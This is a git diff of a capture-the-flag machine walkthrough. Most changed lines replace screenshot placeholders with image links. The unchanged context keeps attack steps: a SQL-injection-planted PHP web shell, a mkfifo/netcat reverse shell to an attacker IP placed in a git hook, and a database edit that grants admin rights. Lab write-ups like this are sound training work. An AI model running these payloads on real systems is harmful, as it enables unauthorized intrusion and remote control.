@@ -25,7 +25,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 2. Navigate to the web application at `http://<TARGET_IP>`. After exploring the site, inspect the cookies using browser developer tools (F12). Changing the value of the cookie named `id` produces an error on the page, indicating potential SQL injection vulnerability.
 
-[SCREEN01]
+<img width="1019" height="599" alt="SCREEN01" src="https://github.com/user-attachments/assets/f1fee033-2e73-4b68-85bc-4d781b2d3c2c" />
 
 3. Test for SQL injection by adding a single quote `'` at the end of the cookie value. This results in the error message: `Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''<COOKIE_VALUE>''' at line 1`. This confirms SQL injection vulnerability.
 
@@ -39,7 +39,7 @@ The hex value decodes to: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pr
 
 7. Test the web shell by visiting `http://<TARGET_IP>/shell.php?cmd=whoami`. This should return `www-data`.
 
-[SCREEN02]
+<img width="763" height="170" alt="SCREEN02" src="https://github.com/user-attachments/assets/074e3700-f1ac-4d05-93ae-f807909d8c8f" />
 
 8. Set up a netcat listener on your attacking machine to catch the reverse shell:
 
@@ -85,7 +85,7 @@ ssh dylan@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN03]
+<img width="660" height="309" alt="SCREEN03" src="https://github.com/user-attachments/assets/597e582f-c234-42a4-afc8-4f07229c375c" />
 
 ---
 
@@ -128,7 +128,7 @@ UPDATE user SET is_admin=1 WHERE lower_name="luki1235512";
 .quit
 ```
 
-[SCREEN04]
+<img width="1456" height="165" alt="SCREEN04" src="https://github.com/user-attachments/assets/caedf8e8-3ddb-45b3-b9f3-2c807b40e717" />
 
 6. Upload the modified database back to the target machine:
 
@@ -148,7 +148,7 @@ mkfifo /tmp/f; nc <ATTACKER_IP> 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 This hook will execute when you push to the repository.
 
-[SCREEN05]
+<img width="1198" height="820" alt="SCREEN05" src="https://github.com/user-attachments/assets/6b0a80ae-2f87-466e-b118-24854478b3a2" />
 
 9. Start a netcat listener on your attacking machine:
 
@@ -165,8 +165,6 @@ git add README.md
 git commit -m "Exploit"
 git push
 ```
-
-[SCREEN06]
 
 11. You should receive a reverse shell connection as the `git` user. Check your privileges:
 
@@ -214,4 +212,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN07]
+<img width="401" height="182" alt="SCREEN07" src="https://github.com/user-attachments/assets/9307e3c6-1c46-4f77-a3a0-3ded9bcf0843" />
